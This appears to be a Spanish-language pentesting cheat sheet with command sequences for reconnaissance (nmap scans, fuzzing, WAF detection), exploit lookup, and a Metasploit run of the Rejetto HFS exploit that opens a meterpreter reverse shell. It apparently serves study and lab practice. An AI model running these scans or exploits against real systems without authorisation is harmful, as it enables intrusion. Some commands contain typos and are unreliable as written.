# DIRECTORIOS DE TRABAJO
- content
- exploits
- namp
- scripts
- tmp

# VULNERABILIDAD REMOTA VS LOCAL
Atacante (Remoto) -> Víctima
Atacante (Local) -> Víctima

# IDENTIFICAR ROUTER
route -n

# ESTABLECER CONTACTO
ping -c 1 192.168.1.1
ping -c 1 192.168.1.1 -R

# ESCANEAR HOSTS DE LA RED
sudo nmap -sn 192.168.1.0/24

# ESCANEAR PUERTOS ABIERTOS
sudo nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- 192.168.1.41
nmap 192.168.1.41 -p- --open -v -n

# ESCANEAR VERSIONES Y SERVICIOS DE LOS PUERTOS
1. Herramienta: Wappalyzer
2. nmap -sC -sV -p(port1, port2, port3...) IP
3. whatweb https://IP 2>/dev/null

# LISTAR CATEGORIAS DE NMAP
locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u

# BUSCAR VULNERABILIDAD
nmap -p(port1, port2, port3...) IP --script "vuln and safe"

# FUZZING HTTP CON NMAP
nmap -p(port1, port2, port3...) IP --script http-enum

# CAPTURAR EL TRAFICO DE UN FUZZING CON TCPDUMP
tcpdump -i enp0s3 -w captura.cab -v
tshark -r captura.cab -Y "http" 2>/dev/null
tshark -r captura.cab -Y "http" -Tjson 2>/dev/null
tshark -r captura.cab -Y "http" -Tfield -e tcp.payload 2>/dev/null | xxd -ps -r | grep "get" | awk '{print $2}' | sort -u

# CAPTURAR EL TRAFICO DE UN FUZZING CON WIRESHARK
1. Apply filter: http.request.method=="GET" and not http.request.method=="HEAD"

# FUZZING CON WFUZZ (dirbuster, wfuzz, dirb, gobuster, dirsearch...)
wfuzz -c -L -t 400 --sc=200 -w directory-list.txt http://IP/FUZZ
wfuzz -c -L -t 400 --sc=200 -w directory-list.txt -w extensions.txt http://IP/FUZZ.FUZ2Z

# DETECTAR UN WAF (nessus, acunetix, openvas...)
wafw00f https://facebook.com
[Reconocimiento] nikto -h http://apocalyst.htb
[Wordpress Scan] wpscan --url http://apocalyst.htb -e vp,u
[Wordpress Scan] wpseku -u http://apocalyst.htb

# BUSCAR UN EXPLOIT PARA UNA VERSION DETERMINADA DE SERVICIO
searchsploit monstra 3.0.4
searchsploit gwolle
searchsploit http file server

# HERRAMIENTA (searchsploit)
searchsploit -u                     #Update database
searchsploit http file server -w    #Get the URL
searchsploit -x 39161               #Get the code
searchsploit -m 39161               #Download the code

# HERRAMIENTA (metasploit)
msfdb run                                       #Start the client
search hfs                                      #Search exploit
use expoit/windows/http/rejetto_hfs_exec        #Use the exploit
info                                            #Get exploit information
show options                                    #Show parameters (Module Options, Payload Options...)
set RHOSTS IP                                   #Set the remote host
set LHOSTS IP                                   #Set the local host
set RPORT IP                                    #Set the remote port
set LPORT IP                                    #Set the local port
set payload windows/meterpreter/reverse_tcp     #Reverse interactive shell
exploit                                         #Run the exploit
meterpreter> shell                              #Get the local interactive console

# HERRAMIENTA (burpsuite)
1. Proxy > Options > Add Local Proxy Listener
2. Browser > Preferences > Network > Settings > Manual Proxy Configuration > Set the HTTP Proxy > Activate FTP and HTTPS
3. (local) https://burpsuite/ > CA Certificate > Browser > Preferences > Certificates > View Certificates > Import
4. Proxy > Options > Miscellaneous > Don't send items if out of scope
5. Target > Scope > Add
6. Repeater > (modify) Request + Response
7. Intruder > Sniper > Edit Position > Add Payload > Options > Add Grep Extract > Refetch Response > Start Attack